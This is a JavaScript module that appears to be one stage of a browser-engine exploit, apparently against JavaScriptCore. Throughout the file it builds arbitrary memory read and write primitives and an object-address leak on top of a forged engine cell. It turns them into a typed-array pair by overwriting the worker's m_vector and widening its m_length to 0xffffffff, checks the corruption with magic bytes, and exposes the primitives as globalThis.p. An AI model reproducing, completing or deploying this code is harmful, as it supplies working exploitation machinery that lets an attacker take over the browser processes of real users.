import { int64 } from "./int64.js";

import {
    releaseFakeCell, fakeCellReleased,
    carrierHeaderCopy, carrierHomeVector
} from "./core.js?v=final";

let carrier = null;

function toI64(x) {
    if (x instanceof int64)
        return x;
    if (typeof x === "number") {
        if (!Number.isFinite(x) || Math.floor(x) !== x || x < 0)
            throw new TypeError(`mem: bad numeric address ${x}`);

        const hi = Math.floor(x / 0x100000000);
        return new int64(x - hi * 0x100000000, hi);
    }
    if (x !== null && typeof x === "object" && "low" in x)
        return new int64(x.low, ("hi" in x) ? x.hi : x.high);
    throw new TypeError("mem: bad address");
}

function addrNumber(x) {
    const a = toI64(x);
    if (a.hi > 0xffff)
        throw new RangeError(`mem: non-canonical address 0x${a.toString()}`);
    return a.hi * 0x100000000 + a.low;
}

function aimFor(addrLike, size) {
    const address = addrNumber(addrLike);
    if (size > carrier.windowBytes)
        throw new RangeError(`mem: ${size} exceeds the ${carrier.windowBytes}-byte window`);
    carrier.aim(address);
    return address;
}

function valueLow32(value, who) {
    if (typeof value === "number") {
        if (!Number.isFinite(value) || Math.floor(value) !== value)
            throw new TypeError(`${who}: non-integer value ${value}`);
        return value >>> 0;
    }
    if (value instanceof int64)
        return value.low >>> 0;
    if (value !== null && typeof value === "object" && "low" in value)
        return toI64(value).low >>> 0;
    throw new TypeError(`${who}: value must be a number or an int64`);
}

function read1(addr) {
    aimFor(addr, 1);
    try {
        return carrier.view[0];
    } finally {
        carrier.restore();
    }
}

function read2(addr) {
    aimFor(addr, 2);
    try {
        const v = carrier.view;
        return v[0] | (v[1] << 8);
    } finally {
        carrier.restore();
    }
}

function read4(addr) {
    aimFor(addr, 4);
    try {
        const v = carrier.view;
        return (v[0] | (v[1] << 8) | (v[2] << 16) | (v[3] << 24)) >>> 0;
    } finally {
        carrier.restore();
    }
}

function read8(addr) {
    let lo, hi;
    aimFor(addr, 8);
    try {
        const v = carrier.view;
        lo = (v[0] | (v[1] << 8) | (v[2] << 16) | (v[3] << 24)) >>> 0;
        hi = (v[4] | (v[5] << 8) | (v[6] << 16) | (v[7] << 24)) >>> 0;
    } finally {
        carrier.restore();
    }
    return new int64(lo, hi);
}

function write1(addr, value) {
    const v = valueLow32(value, "mem.write1") & 0xff;
    aimFor(addr, 1);
    try {
        carrier.view[0] = v;
    } finally {
        carrier.restore();
    }
}

function write2(addr, value) {
    const v = valueLow32(value, "mem.write2") & 0xffff;
    aimFor(addr, 2);
    try {
        const view = carrier.view;
        view[0] = v & 0xff;
        view[1] = (v >>> 8) & 0xff;
    } finally {
        carrier.restore();
    }
}

function write4(addr, value) {
    const v = valueLow32(value, "mem.write4");
    aimFor(addr, 4);
    try {
        const view = carrier.view;
        view[0] = v & 0xff;
        view[1] = (v >>> 8) & 0xff;
        view[2] = (v >>> 16) & 0xff;
        view[3] = (v >>> 24) & 0xff;
    } finally {
        carrier.restore();
    }
}

function write8(addr, value) {
    let lo, hi;
    if (value instanceof int64) {
        lo = value.low >>> 0;
        hi = value.hi >>> 0;
    } else if (typeof value === "number") {
        if (!Number.isFinite(value) || Math.floor(value) !== value)
            throw new TypeError(`mem.write8: non-integer value ${value}`);
        if (value < 0) {
            if (value < -0x80000000)
                throw new RangeError(`mem.write8: value ${value} below int32 range`);
            lo = value >>> 0;
            hi = 0xffffffff;
        } else if (value <= 0xffffffff) {
            lo = value >>> 0;
            hi = 0;
        } else {
            throw new RangeError(
                `mem.write8: ${value} exceeds 32 bits -- pass an int64`);
        }
    } else if (value !== null && typeof value === "object" && "low" in value) {
        const n = toI64(value);
        lo = n.low; hi = n.hi;
    } else {
        throw new TypeError("mem.write8: value must be int64 or number");
    }

    aimFor(addr, 8);
    try {
        const view = carrier.view;
        view[0] = lo & 0xff;
        view[1] = (lo >>> 8) & 0xff;
        view[2] = (lo >>> 16) & 0xff;
        view[3] = (lo >>> 24) & 0xff;
        view[4] = hi & 0xff;
        view[5] = (hi >>> 8) & 0xff;
        view[6] = (hi >>> 16) & 0xff;
        view[7] = (hi >>> 24) & 0xff;
    } finally {
        carrier.restore();
    }
}

function leakval(obj) {
    if (obj === null || (typeof obj !== "object" && typeof obj !== "function"))
        throw new TypeError("mem.leakval: not an object");

    carrier.setLeakSlot(obj);
    let lo, hi;
    try {

        aimFor(carrier.leakSlotAddress, 8);
        try {
            const v = carrier.view;
            lo = (v[0] | (v[1] << 8) | (v[2] << 16) | (v[3] << 24)) >>> 0;
            hi = (v[4] | (v[5] << 8) | (v[6] << 16) | (v[7] << 24)) >>> 0;
        } finally {
            carrier.restore();
        }
    } finally {
        carrier.clearLeakSlot();
    }

    if (hi > 0xffff || (lo === 0 && hi === 0) || (lo & 7) !== 0)
        throw new Error(`mem.leakval: implausible cell 0x${
            new int64(lo, hi).toString()}`);
    return new int64(lo, hi);
}

function readInto(dest, addr, count) {
    const base = addrNumber(addr);
    let done = 0;
    while (done < count) {
        const chunk = Math.min(count - done, carrier.windowBytes);
        aimFor(base + done, chunk);
        try {
            for (let i = 0; i < chunk; ++i)
                dest[done + i] = carrier.view[i];
        } finally {
            carrier.restore();
        }
        done += chunk;
    }
    return dest;
}

const WORKER_BUFFER_SIZE = 0x100;
const PAIR_IDENT_OFFSET = 0x20;
const MAIN_IDENT_OFFSET = 0x40;
const PAIR_HEADER_BYTES = 0x20;
const HOME_BYTE = 0x3c;

const WORKER_LENGTH_MAX = 0xffffffff;

const mainMagic = new Uint8Array([0x63, 0x9e, 0x1f, 0x29, 0xd2, 0x84, 0x0b, 0x5c]);
const workerMagic = new Uint8Array([0x9e, 0x37, 0x79, 0xb9, 0x7f, 0x4a, 0x7c, 0x15]);

const workerHeader = new Uint8Array(PAIR_HEADER_BYTES);
const identityBytes = new Uint8Array(8);
const workerOriginalVector = new Uint8Array(8);
const workerOriginalLength = new Uint8Array(4);
const pairScratch = new ArrayBuffer(8);
const pairScratchBytes = new Uint8Array(pairScratch);
const pairScratchWords = new Uint32Array(pairScratch);

let mainView = null;
let workerBuffer = null;
let workerView = null;
let workerMirror = null;
let pairVectorOffset = -1;
const retained = [];

export const pairStatus = {

    state: "not-attempted",
    promoted: false,

    committed: false,
    rolledBack: false,
    rollbackClean: null,
    fallback: false,
    stage: "not-attempted",
    failedAt: null,
    error: null,

    vectorOffset: -1, lengthOffset: -1, modeOffset: -1, butterflyOffset: -1,

    mainAddress: null,
    mainVector: null,

    mainRecordVector: null,
    mainWindow: -1,
    mainCellFromFakeSlot: null,
    mainIdentity: null,
    mainAtHome: null,

    workerAddress: null,
    workerVector: null,
    workerButterfly: null,
    workerWindow: -1,
    workerLength: -1,
    workerIdentity: null,

    structureID: -1, mode: -1, leakvalAgrees: false,

    fakeAddress: null,
    fakeButterfly: null,
    released: []
};

function u32At(bytes, offset) {
    return (bytes[offset] | (bytes[offset + 1] << 8)
        | (bytes[offset + 2] << 16) | (bytes[offset + 3] << 24)) >>> 0;
}

function low48At(bytes, offset) {
    return bytes[offset]
        + bytes[offset + 1] * 0x100
        + bytes[offset + 2] * 0x10000
        + bytes[offset + 3] * 0x1000000
        + bytes[offset + 4] * 0x100000000
        + bytes[offset + 5] * 0x10000000000;
}

function canonical48(bytes, offset) {
    return bytes[offset + 6] === 0 && bytes[offset + 7] === 0;
}

function sameBytes(left, right, count) {
    for (let i = 0; i < count; ++i) {
        if (left[i] !== right[i])
            return false;
    }
    return true;
}

function hexOf(bytes, count) {
    let out = "";
    for (let i = 0; i < count; ++i)
        out += (bytes[i] & 0xff).toString(16).padStart(2, "0");
    return out;
}

function pairAim(address) {
    const high = Math.floor(address / 0x100000000);
    pairScratchWords[0] = address - high * 0x100000000;
    pairScratchWords[1] = high;
    for (let i = 0; i < 8; ++i)
        mainView[pairVectorOffset + i] = pairScratchBytes[i];
}

function pairRestore() {
    for (let i = 0; i < 8; ++i)
        mainView[pairVectorOffset + i] = workerOriginalVector[i];
}

function buildPairCarrier(fake) {
    const validate = fake.validate;
    return {
        aim(address) {
            if (mainView === null || workerView === null)
                throw new Error("mem.pair.aim: the pair has been dropped");
            if (!validate(address))
                throw new RangeError(`mem.pair.aim: implausible address ${address}`);
            pairAim(address);
        },
        restore() {
            if (mainView === null)
                throw new Error("mem.pair.restore: the pair has been dropped");
            pairRestore();
        },
        get view() { return workerView; },

        windowBytes: WORKER_BUFFER_SIZE,

        holder: fake.holder,
        holderAddress: fake.holderAddress,
        leakSlotOffset: fake.leakSlotOffset,
        leakSlotAddress: fake.leakSlotAddress,
        setLeakSlot: fake.setLeakSlot,
        clearLeakSlot: fake.clearLeakSlot,
        anchorObject: fake.anchorObject,
        anchorObjectAddress: fake.anchorObjectAddress,
        textarea: fake.textarea,
        textareaAddress: fake.textareaAddress,

        profile: fake.profile,
        attempts: fake.attempts,
        validate,
        hostAddress: fake.hostAddress,
        fakeAddress: fake.fakeAddress,
        pair: pairStatus,

        assertHome() {
            if (workerView === null || workerMirror === null)
                return false;
            return workerView[0] === HOME_BYTE && workerMirror[0] === HOME_BYTE;
        }
    };
}

function brokenCarrier(why) {
    const die = () => {
        throw new Error("mem: the primitive is disabled -- the promotion failed "
            + `and its rollback did not verify (${why})`);
    };
    return {
        aim: die, restore: die, setLeakSlot: die, clearLeakSlot: die,
        get view() { return die(); },
        get windowBytes() { return die(); },
        get leakSlotAddress() { return die(); },
        validate: () => false,
        assertHome: () => false,
        profile: null,
        pair: pairStatus
    };
}

function proveMagic(note, who, slot, at, expected, context) {
    const target = toI64(at);
    const record = {
        at: target, expected: hexOf(expected, 8), found: null, pass: false
    };
    pairStatus[slot] = record;
    readInto(identityBytes, at, 8);
    record.found = hexOf(identityBytes, 8);
    record.pass = sameBytes(identityBytes, expected, 8);
    note(`PAIR-IDENTITY-${who.toUpperCase()}`,
        `at=0x${target.toString()}-found=${record.found}`
        + `-expected=${record.expected}-pass=${record.pass}-${context}`);
    if (!record.pass)
        throw new Error(`mem.promote: ${who} identity failed -- read `
            + `${record.found} at 0x${target.toString()}, expected `
            + `${record.expected} (${context})`);
    return record;
}

export function promoteToRealPair(onEvent) {
    const note = (tag, detail) => {
        pairStatus.stage = tag;
        if (typeof onEvent === "function") {
            try { onEvent(tag, detail === undefined ? "" : String(detail)); }
            catch {  }
        }
    };

    if (pairStatus.promoted)
        throw new Error("mem.promote: already promoted");
    if (carrier === null || typeof carrier.aim !== "function")
        throw new TypeError("mem.promote: no carrier");
    if (fakeCellReleased())
        throw new Error("mem.promote: core.js already released the fake cell");

    const fake = carrier;
    const profile = fake.profile;
    if (!profile || typeof profile.vectorOffset !== "number"
        || typeof profile.butterflyOffset !== "number"
        || typeof profile.inlineSlotOffset !== "number")
        throw new TypeError("mem.promote: carrier has no layout profile");

    if (typeof fake.hostAddress !== "number" || !fake.validate(fake.hostAddress)
        || typeof fake.fakeAddress !== "number" || !fake.validate(fake.fakeAddress)
        || fake.fakeAddress - fake.hostAddress !== profile.inlineSlotOffset)
        throw new TypeError("mem.promote: the fake cell's address is unusable "
            + `(host=${fake.hostAddress} fake=${fake.fakeAddress})`);

    const VECTOR_OFF = profile.vectorOffset;
    const LENGTH_OFF = VECTOR_OFF + 8;
    const MODE_OFF = LENGTH_OFF + 4;
    const BUTTERFLY_OFF = profile.butterflyOffset;
    pairStatus.vectorOffset = VECTOR_OFF;
    pairStatus.lengthOffset = LENGTH_OFF;
    pairStatus.modeOffset = MODE_OFF;
    pairStatus.butterflyOffset = BUTTERFLY_OFF;

    let committed = false;
    let rebound = false;

    try {
        note("PAIR-BEGIN", `window=${fake.windowBytes}-vector=+${VECTOR_OFF}`
            + `-length=+${LENGTH_OFF}-mode=+${MODE_OFF}`);

        const mainRecord = carrierHeaderCopy();
        const mainHomeVector = carrierHomeVector();
        if (!(mainRecord instanceof Uint8Array)
            || mainRecord.length < PAIR_HEADER_BYTES)
            throw new Error("mem.promote: core.js's carrier record is the wrong shape");

        const recordVector = low48At(mainRecord, VECTOR_OFF);
        pairStatus.mainVector = toI64(mainHomeVector);
        pairStatus.mainRecordVector = toI64(recordVector);
        pairStatus.mainWindow = u32At(mainRecord, LENGTH_OFF);
        pairStatus.structureID = u32At(mainRecord, 0);
        note("PAIR-MAIN-RECORD", `home=0x${pairStatus.mainVector.toString()}`
            + `-record=0x${pairStatus.mainRecordVector.toString()}`
            + `-len=${pairStatus.mainWindow}-mode=${mainRecord[MODE_OFF]}`
            + `-sid=0x${(pairStatus.structureID >>> 0).toString(16)}`);

        if (recordVector !== mainHomeVector)
            throw new Error("mem.promote: profile.vectorOffset disagrees with the "
                + `recorded home vector (record 0x${pairStatus.mainRecordVector.toString()}`
                + ` vs home 0x${pairStatus.mainVector.toString()})`);
        if (!fake.validate(mainHomeVector) || mainHomeVector % 8 !== 0)
            throw new Error("mem.promote: the recorded home vector is implausible "
                + `(0x${pairStatus.mainVector.toString()})`);

        if (pairStatus.mainWindow !== fake.windowBytes)
            throw new Error(`mem.promote: the record's m_length (${pairStatus.mainWindow})`
                + ` is not the carrier window (${fake.windowBytes})`
                + " -- LENGTH_OFF does not hold on main");

        mainView = fake.view;
        retained.push(mainView);
        if (!(mainView instanceof Uint8Array)
            || mainView.length !== fake.windowBytes
            || MAIN_IDENT_OFFSET + 8 > fake.windowBytes)
            throw new Error("mem.promote: the carrier's view is not what core.js described");

        pairStatus.fakeAddress = toI64(fake.fakeAddress);
        pairStatus.fakeButterfly = read8(fake.fakeAddress + BUTTERFLY_OFF);
        note("PAIR-FAKE-BUTTERFLY", `host=0x${toI64(fake.hostAddress).toString()}`
            + `-fake=0x${pairStatus.fakeAddress.toString()}`
            + `-butterfly=0x${pairStatus.fakeButterfly.toString()}`);

        workerBuffer = new ArrayBuffer(WORKER_BUFFER_SIZE);
        workerView = new Uint8Array(workerBuffer);
        workerMirror = new Uint8Array(workerBuffer);
        retained.push(workerBuffer, workerView, workerMirror);
        workerMirror[0] = HOME_BYTE;
        for (let i = 0; i < 8; ++i)
            workerMirror[PAIR_IDENT_OFFSET + i] = workerMagic[i];

        if (workerView[0] !== HOME_BYTE)
            throw new Error("mem.promote: workerView does not alias workerMirror");

        for (let i = 0; i < 8; ++i)
            mainView[MAIN_IDENT_OFFSET + i] = mainMagic[i];
        for (let i = 0; i < 8; ++i) {
            if (mainView[MAIN_IDENT_OFFSET + i] !== mainMagic[i])
                throw new Error("mem.promote: main's magic did not read back through "
                    + "its own JS view -- the carrier is not at home");
        }

        const mainAddr = addrNumber(leakval(mainView));
        const workerAddr = addrNumber(leakval(workerView));
        pairStatus.mainAddress = toI64(mainAddr);
        pairStatus.workerAddress = toI64(workerAddr);
        note("PAIR-CELLS", `main=0x${pairStatus.mainAddress.toString()}`
            + `-worker=0x${pairStatus.workerAddress.toString()}`);
        if (mainAddr === workerAddr)
            throw new Error("mem.promote: main and worker leaked the same cell");

        if (mainAddr % 0x10 !== 0 || workerAddr % 0x10 !== 0)
            throw new Error("mem.promote: a leaked cell is not atom-aligned");

        const fromFakeSlot = read8(fake.fakeAddress + VECTOR_OFF);
        pairStatus.mainCellFromFakeSlot = fromFakeSlot;
        note("PAIR-MAIN-CELL", `fake-m_vector=0x${fromFakeSlot.toString()}`
            + `-leakval=0x${pairStatus.mainAddress.toString()}`
            + `-at=0x${toI64(fake.fakeAddress + VECTOR_OFF).toString()}`);
        if (fromFakeSlot.low !== pairStatus.mainAddress.low
            || fromFakeSlot.hi !== pairStatus.mainAddress.hi)
            throw new Error("mem.promote: main CELL identity failed -- the fake "
                + `cell's m_vector slot holds 0x${fromFakeSlot.toString()} but `
                + `leakval(mainView) says 0x${pairStatus.mainAddress.toString()}`);

        proveMagic(note, "main", "mainIdentity",
            mainHomeVector + MAIN_IDENT_OFFSET, mainMagic,
            `home=0x${pairStatus.mainVector.toString()}`
            + `-cell=0x${pairStatus.mainAddress.toString()}`
            + `-offset=+0x${MAIN_IDENT_OFFSET.toString(16)}`);

        readInto(workerHeader, workerAddr, PAIR_HEADER_BYTES);
        const workerVector = low48At(workerHeader, VECTOR_OFF);
        const workerButterfly = low48At(workerHeader, BUTTERFLY_OFF);
        pairStatus.mode = workerHeader[MODE_OFF];
        pairStatus.workerWindow = u32At(workerHeader, LENGTH_OFF);
        pairStatus.workerVector = toI64(workerVector);
        pairStatus.workerButterfly = toI64(workerButterfly);
        note("PAIR-WORKER-HEADER", `sid=0x${u32At(workerHeader, 0).toString(16)}`
            + `-vector=0x${pairStatus.workerVector.toString()}`
            + `-len=${pairStatus.workerWindow}-mode=${pairStatus.mode}`
            + `-butterfly=0x${pairStatus.workerButterfly.toString()}`);

        const gate =
            u32At(workerHeader, 0) === pairStatus.structureID
            && (workerHeader[7] === 0 || workerHeader[7] === 1)
            && pairStatus.workerWindow === WORKER_BUFFER_SIZE

            && workerHeader[MODE_OFF] === mainRecord[MODE_OFF]
            && workerHeader[MODE_OFF + 1] === 0
            && workerHeader[MODE_OFF + 2] === 0
            && workerHeader[MODE_OFF + 3] === 0

            && canonical48(workerHeader, BUTTERFLY_OFF)
            && workerButterfly > 0x100000000 && workerButterfly % 8 === 0

            && canonical48(workerHeader, VECTOR_OFF)
            && fake.validate(workerVector) && workerVector % 8 === 0
            && workerVector !== mainHomeVector;
        if (!gate)
            throw new Error("mem.promote: header gate failed"
                + ` worker-len=${pairStatus.workerWindow}`
                + ` worker-mode=${workerHeader[MODE_OFF]}`
                + ` main-mode=${mainRecord[MODE_OFF]}`
                + ` worker-sid=${u32At(workerHeader, 0)}`
                + ` main-sid=${pairStatus.structureID}`
                + ` worker-vector=0x${pairStatus.workerVector.toString()}`
                + ` worker-butterfly=0x${pairStatus.workerButterfly.toString()}`
                + ` main-home=0x${pairStatus.mainVector.toString()}`);

        proveMagic(note, "worker", "workerIdentity",
            workerVector + PAIR_IDENT_OFFSET, workerMagic,
            `vector=0x${pairStatus.workerVector.toString()}`
            + `-cell=0x${pairStatus.workerAddress.toString()}`
            + `-offset=+0x${PAIR_IDENT_OFFSET.toString(16)}`);
        note("PAIR-IDENTITY", "main-cell=proved-main-buffer=proved-worker=proved");

        for (let i = 0; i < 8; ++i)
            workerOriginalVector[i] = workerHeader[VECTOR_OFF + i];
        for (let i = 0; i < 4; ++i)
            workerOriginalLength[i] = workerHeader[LENGTH_OFF + i];

        note("PAIR-COMMIT", `main=0x${pairStatus.mainAddress.toString()}`
            + `-worker=0x${pairStatus.workerAddress.toString()}`
            + "-next=aim-without-restore");
        aimFor(workerAddr, PAIR_HEADER_BYTES);
        committed = true;
        pairStatus.committed = true;

        for (let i = 0; i < 4; ++i)
            mainView[LENGTH_OFF + i] = 0xff;
        pairStatus.workerLength = workerView.length;

        if (pairStatus.workerLength !== WORKER_LENGTH_MAX)
            throw new Error("mem.promote: the m_length write did not land -- "
                + `worker.length reads ${pairStatus.workerLength}`);
        if (workerMirror.length !== WORKER_BUFFER_SIZE)
            throw new Error("mem.promote: the mirror was widened too -- the write "
                + "went somewhere structural, not to worker's m_length");
        if (workerView[0] !== HOME_BYTE)
            throw new Error("mem.promote: worker no longer sees its own buffer");

        if (mainView[MODE_OFF] !== workerHeader[MODE_OFF]
            || mainView[MODE_OFF + 1] !== 0 || mainView[MODE_OFF + 2] !== 0
            || mainView[MODE_OFF + 3] !== 0)
            throw new Error("mem.promote: m_mode was disturbed by the widening");

        for (let i = 0; i < 8; ++i) {
            if (mainView[VECTOR_OFF + i] !== workerOriginalVector[i])
                throw new Error("mem.promote: worker's m_vector moved during the widening");
        }
        note("PAIR-WIDENED", `length=0x${WORKER_LENGTH_MAX.toString(16)}`
            + `-mode=0x${pairStatus.mode.toString(16)}`);

        pairVectorOffset = VECTOR_OFF;
        carrier = buildPairCarrier(fake);
        rebound = true;

        readInto(identityBytes, workerVector + PAIR_IDENT_OFFSET, 8);
        if (!sameBytes(identityBytes, workerMagic, 8))
            throw new Error("mem.promote: read through the pair returned "
                + `${hexOf(identityBytes, 8)}, expected ${hexOf(workerMagic, 8)}`);
        write8(workerVector + PAIR_IDENT_OFFSET,
            new int64(0x0d0c0b0a, 0x04030201));
        const back = [0x0a, 0x0b, 0x0c, 0x0d, 0x01, 0x02, 0x03, 0x04];
        for (let i = 0; i < 8; ++i) {
            if (workerMirror[PAIR_IDENT_OFFSET + i] !== back[i])
                throw new Error(`mem.promote: write through the pair failed at byte ${i}`);
        }
        for (let i = 0; i < 8; ++i)
            workerMirror[PAIR_IDENT_OFFSET + i] = workerMagic[i];

        const workerAgain = addrNumber(leakval(workerView));
        pairStatus.leakvalAgrees = workerAgain === workerAddr;
        if (!pairStatus.leakvalAgrees)
            throw new Error("mem.promote: leakval through the pair disagrees "
                + `(0x${toI64(workerAgain).toString()} vs `
                + `0x${pairStatus.workerAddress.toString()})`);

        const mv = read8(mainAddr + VECTOR_OFF);
        if (mv.low !== pairStatus.workerAddress.low
            || mv.hi !== pairStatus.workerAddress.hi)
            throw new Error(`mem.promote: main.m_vector reads 0x${mv.toString()},`
                + ` expected worker's cell 0x${pairStatus.workerAddress.toString()}`);
        if (read4(mainAddr + LENGTH_OFF) !== fake.windowBytes)
            throw new Error("mem.promote: main's own m_length was disturbed");
        note("PAIR-REPROVED", `main-m_vector=0x${mv.toString()}`
            + `-leakval=0x${toI64(workerAgain).toString()}`);

        note("PAIR-RELEASE", "next=release-fake-cell-and-debris");
        const rel = releaseFakeCell();
        pairStatus.released = rel.released;
        pairStatus.historyCleared = !!rel.historyCleared;
        if (!fakeCellReleased())
            throw new Error("mem.promote: core.js did not release the fake cell");
        if (fake.assertHome() !== false)
            throw new Error("mem.promote: core.js's carrier still reports itself live");

        pairStatus.promoted = true;
        pairStatus.state = "pair";
        pairStatus.error = null;
        note("PAIR-UP", `main=0x${pairStatus.mainAddress.toString()}`
            + `-worker=0x${pairStatus.workerAddress.toString()}`
            + `-home=0x${pairStatus.mainVector.toString()}`
            + `-mode=0x${pairStatus.mode.toString(16)}`
            + `-sid=0x${pairStatus.structureID.toString(16)}`
            + `-released=${pairStatus.released.length}`
            + `-history-cleared=${pairStatus.historyCleared}`);
        return pairStatus;

    } catch (error) {

        pairStatus.failedAt = pairStatus.stage;
        pairStatus.error = `${error && error.name}: ${String(error && error.message)}`;

        let clean = true;
        if (committed) {
            pairStatus.rolledBack = true;
            try {
                for (let i = 0; i < 8; ++i)
                    mainView[VECTOR_OFF + i] = workerOriginalVector[i];
                for (let i = 0; i < 4; ++i)
                    mainView[LENGTH_OFF + i] = workerOriginalLength[i];
            } catch { clean = false; }
            try { fake.restore(); } catch { clean = false; }

            try {
                if (!(workerView.length === WORKER_BUFFER_SIZE
                    && workerMirror.length === WORKER_BUFFER_SIZE
                    && workerView[0] === HOME_BYTE
                    && fake.assertHome() === true))
                    clean = false;
            } catch { clean = false; }
            pairStatus.rollbackClean = clean;
        }

        try { pairStatus.mainAtHome = fake.assertHome(); }
        catch { pairStatus.mainAtHome = null; }

        pairStatus.promoted = false;
        pairStatus.fallback = true;
        pairStatus.state = (committed && !clean) ? "broken" : "fake";
        if (pairStatus.state === "broken")
            carrier = brokenCarrier(pairStatus.error);
        else if (rebound)
            carrier = fake;

        pairVectorOffset = -1;

        workerView = null;
        workerMirror = null;
        workerBuffer = null;
        mainView = null;
        note("PAIR-FALLBACK", `state=${pairStatus.state}`
            + `-committed=${committed}-rollback-clean=${pairStatus.rollbackClean}`
            + `-main-at-home=${pairStatus.mainAtHome}`
            + `-at=${pairStatus.failedAt}-${pairStatus.error}`);
        throw error;
    }
}

export function installWindowP(c, options) {
    if (!c || typeof c.aim !== "function")
        throw new TypeError("mem: not a carrier");
    carrier = c;

    const prim = {
        read1, read2, read4, read8,
        write1, write2, write4, write8,
        leakval
    };
    globalThis.p = prim;

    const opts = options || {};
    if (opts.promote === false) {
        pairStatus.state = "disabled";
        pairStatus.stage = "disabled";
        pairStatus.error = "promotion disabled by the caller (negative control)";
        return prim;
    }

    try {
        promoteToRealPair(opts.onEvent);
    } catch {

        if (pairStatus.state === "broken") {
            globalThis.p = undefined;
            throw new Error("mem: the promotion failed AND its rollback did not "
                + "verify -- window.p has been WITHDRAWN rather than published "
                + `mis-aimed. failedAt=${pairStatus.failedAt} ${pairStatus.error}`);
        }
    }
    return prim;
}

export {
    read1, read2, read4, read8,
    write1, write2, write4, write8,
    leakval,
    readInto, toI64, addrNumber, int64
};
